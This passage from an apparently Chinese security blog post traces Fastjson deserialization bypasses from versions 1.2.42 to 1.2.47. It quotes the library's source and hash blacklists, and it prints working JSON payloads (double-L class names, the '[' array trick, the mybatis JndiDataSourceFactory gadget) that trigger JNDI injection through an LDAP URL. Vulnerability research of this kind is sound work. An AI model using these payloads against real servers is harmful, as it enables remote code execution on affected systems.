<p>对于第二点，仔细跟进去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hash算法常量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line">        <span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line">        <span class="comment">// 可以发现这边只进行了一次删除</span></span><br><span class="line">        <span class="keyword">if</span> ((((BASIC</span><br><span class="line">                ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">                * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">                * PRIME;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">            <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure>

<p>确实有效的干掉了L开头；结尾的payload。</p>
<h1 id="1-2-42-绕过"><a href="#1-2-42-绕过" class="headerlink" title="1.2.42 绕过"></a>1.2.42 绕过</h1><p>但是在以上的处理中，发现只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC为：<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p>
<p>在1.2.22-1.2.42版本运行都能成功触发：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130109049.png" alt="image-20200706130109049"></p>
<h2 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;-<span class="number">8720046426850100497L</span>,-<span class="number">8109300701639721088L</span>,-<span class="number">7966123100503199569L</span>,-<span class="number">7766605818834748097L</span>,-<span class="number">6835437086156813536L</span>,-<span class="number">4837536971810737970L</span>,-<span class="number">4082057040235125754L</span>,-<span class="number">2364987994247679115L</span>,-<span class="number">1872417015366588117L</span>,-<span class="number">254670111376247151L</span>,-<span class="number">190281065685395680L</span>,<span class="number">33238344207745342L</span>,<span class="number">313864100207897507L</span>,<span class="number">1203232727967308606L</span>,<span class="number">1502845958873959152L</span>,<span class="number">3547627781654598988L</span>,<span class="number">3730752432285826863L</span>,<span class="number">3794316665763266033L</span>,<span class="number">4147696707147271408L</span>,<span class="number">5347909877633654828L</span>,<span class="number">5450448828334921485L</span>,<span class="number">5751393439502795295L</span>,<span class="number">5944107969236155580L</span>,<span class="number">6742705432718011780L</span>,<span class="number">7179336928365889465L</span>,<span class="number">7442624256860549330L</span>,<span class="number">8838294710098435315L</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130507612.png" alt="image-20200706130507612"></p>
<p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p>
<p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p>
<p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>。</p>
<p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。</p>
<h1 id="1-2-43-漏洞修复"><a href="#1-2-43-漏洞修复" class="headerlink" title="1.2.43 漏洞修复"></a>1.2.43 漏洞修复</h1><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p>
<p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>的部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line">            <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="comment">//L开头，；结尾</span></span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="comment">//LL开头</span></span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">                    <span class="comment">//直接爆出异常</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>可见就对了LL开头的绕过进行了封堵。</p>
<p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p>
<p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p>
<h1 id="1-2-43-绕过"><a href="#1-2-43-绕过" class="headerlink" title="1.2.43 绕过"></a>1.2.43 绕过</h1><p>之前在类的加载<code>TypeUtils.loadClass</code>发现有两种特殊处理方式：</p>
<ul>
<li>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</li>
<li>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</li>
</ul>
<p>之前版本都是主攻第二种，这里的绕过方式就是针对的第一种，也就是针对<code>[</code>的骚操作。</p>
<p>先直接上payload嗷：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[&#123;,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC：<code>[com.sun.rowset.JdbcRowSetImpl</code></p>
<p>但是如果我们一开始payload直接这样写是会报错的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: exepct <span class="string">'['</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>因此改下payload，在第一个逗号前面加个”[“：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure>

<p>因此就修改得到最终版payload，能够成功触发：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706143651966.png" alt="image-20200706143651966"></p>
<h2 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144236090.png" alt="image-20200706144236090"></p>
<p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144524443.png" alt="image-20200706144524443"></p>
<p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144631729.png" alt="image-20200706144631729"></p>
<h1 id="1-2-44-漏洞修复"><a href="#1-2-44-漏洞修复" class="headerlink" title="1.2.44 漏洞修复"></a>1.2.44 漏洞修复</h1><p>修补了上面的<code>[</code>利用方式。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706145821383.png" alt="image-20200706145821383"></p>
<p>直接抛异常，难受住，家人们；</p>
<h1 id="1-2-44-绕过"><a href="#1-2-44-绕过" class="headerlink" title="1.2.44 绕过"></a>1.2.44 绕过</h1><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
<p>maven：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.4.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p>直接给出payload，要连LDAP或RMI都可以：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="string">"properties"</span>:&#123;<span class="string">"data_source"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
<p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.45的版本中可以看到：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
</tbody></table>
<p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p>
<p>之后更新的版本比如1.2.46也都在补充黑名单。</p>
<p>运行即可成功触发，害怕：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706151641022.png" alt="image-20200706151641022"></p>
<h2 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。</p>
<p>继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。</p>
<p>由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。</p>
<p>直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的,这里面还是需要调试时候直接断点跳转的：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706154549939.png" alt="image-20200706154549939"></p>
<p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p>
<p>函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">10</span>, Exploit</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">188</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1086</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">544</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">203</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">411</span>, InitialContext (javax.naming)</span><br><span class="line">setProperties:<span class="number">56</span>, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">267</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">384</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1356</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1322</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">152</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">162</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">131</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">8</span>, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure>

<h1 id="1-2-47-通杀！"><a href="#1-2-47-通杀！" class="headerlink" title="1.2.47 通杀！"></a>1.2.47 通杀！</h1><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p>
<p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p>
<p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">        <span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                    &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706155729468.png" alt="image-20200706155729468"></p>
<p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p>
<ol>
<li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li>
<li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li>
</ol>
<p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p>
<p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p>
<ol>
<li>TypeUtils.getClassFromMapping(typeName)</li>
<li>deserializers.findClass(typeName)</li>
</ol>
<h2 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h2><p>先看desesrializers，一个hashmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private final IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = new IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure>

<p>因为我们是从中取值，关注一下它是在哪里赋值的,发现是在<code>initDeserializers</code>里面赋值的：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706161123129.png" alt="image-20200706161123129"></p>
<p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p>
<p>除此之外还有两个函数会影响到desesrializers这个map：</p>
<ol>
<li><strong>getDeserializer</strong></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br></pre></td></tr></table></figure>

<p>这个函数里面是会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163202276.png" alt="image-20200706163202276"></p>
<p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p>
<ol start="2">
<li><strong>putDeserializer</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码极其简单，但是只在ParserConfig#<code>getDeserializer</code>和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p>
<p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p>
<p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p>
